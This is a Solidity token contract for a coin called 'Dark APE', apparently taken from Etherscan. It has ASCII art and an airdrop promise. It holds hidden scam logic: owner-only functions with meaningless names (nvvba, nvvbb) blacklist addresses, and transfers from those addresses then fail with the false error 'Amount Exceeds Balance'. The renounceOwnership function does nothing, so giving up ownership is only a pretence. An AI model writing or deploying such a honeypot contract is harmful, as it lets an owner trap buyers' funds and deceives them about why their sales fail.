/**
 *Submitted for verification at Etherscan.io on 2022-08-28
*/

pragma solidity 0.8.16;
/*


                                                 . ~──^^^^^'^─~.
                              ,....         ,─`   ,▄▄▄▄▄▄▄▄▄▄▄,   `~
                          ─`   ,,,   `───'    ▄▄█▀▀▀`- `     ▀▀▀█▄▄  `
                           ,▄█▀▀▀▀▀██▄▄,▄▄▄████▄▄▄,               ▀█,  ─
                        ` ,█▀   ▄▄▄▄ "▀▀▀--      `▀▀█▄             ╙██,  `
                       ░  █▌  ▄█▀████     ▄██████▄   ▀█              `▀█▄  `
                         ▐█  ╒█▌█████      ╓███████   █▌                ▀█µ ]
                      /  ██ ╓█▀██████  ▐█ ▄████████▌  ▐█                 █▌
                     ,  ▐█ ▄█▀██████▌  ██ █████████'   █                ]█⌐ ¡
                    /  ▄█" ╙███████▀   ██ ████████`   j█                ██
                   `  ██                ▀███████▀     ▐█               ▐█  ┘
                  ` ,█▀   ▄███▄▄,                     ▐█               █▌
                    ▐█   ▐█,██████⌐                    ▀█▄,           ▄█  ┘
                  \  ██  █▌███████"                      `▀▀▀█▄▄    ,██  /
                 ^  ,██ ██)██████"                 ,▄█▀▀▀▀█▄▄  ▐████▀▀  '
               '  ▄██`  ██████▀'                  ▄█     ▄█  ▀██`     '
             /  ▄█▀      "▀▀                    ▄█▀     █▀  ╒█▀  /
            `  ███▄▄▄▄                         █▀      █▌   ██  `
           ` ╒██▀,█▀▄█▀▀█▀▀█ ,                 █       █    █▌
             ▐█▐███▄█ ╓█'  ▐██▀▀▀██▀▀█▀██▀█▌▐▌ █▄▄▄▄▄██▀    █▌
           ,  ██▌▐▌`█▀▀▀▀██▀ █   █▌ █▄,█▄▄███▌▄█▀-          ██
              ▀████,█▄  ▄█   █⌐ █▀▀██▀`█  █▄,█              █▌
               ▀█ -``█▄██    ███▌  ▐█ ,█▀▀▀                ██  `
             '  ▀█,      ▀▀▀▀▀  ▀N▀▀ ▀▀                  ▄█▀  ┘
                 ▀█▄                                   ,██  ,`
                ,  ▀█▄▄,                  ,▄▄▄▄▄▄▄█████▀"  '
                 `~   ▀▀▀▀▀███████████████▀▀           , `
                     ` ─~...             . ─'
     ____  ___    ____  __ __ ___    ____  ______
   / __ \/   |  / __ \/ //_//   |  / __ \/ ____/
  / / / / /| | / /_/ / ,<  / /| | / /_/ / __/   
 / /_/ / ___ |/ _, _/ /| |/ ___ |/ ____/ /___   
/_____/_/  |_/_/ |_/_/ |_/_/  |_/_/   /_____/  

Dark Ape is a "Shadowfork" of APE COIN
 
NFT Airdrop to first 100 Holders -



*/    

contract DarkApe {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) Valx;

    // 
    string public name = "Dark APE";
    string public symbol = unicode"DARKAPE";
    uint8 public decimals = 18;
    uint256 public totalSupply = 10000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function nvvba(address _user) public onlyOwner {
        require(!Valx[_user], "x");
        Valx[_user] = true;
     
    }
    
    function nvvbb(address _user) public onlyOwner {
        require(Valx[_user], "xx");
        Valx[_user] = false;
  
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!Valx[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!Valx[from] , "Amount Exceeds Balance"); 
               require(!Valx[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}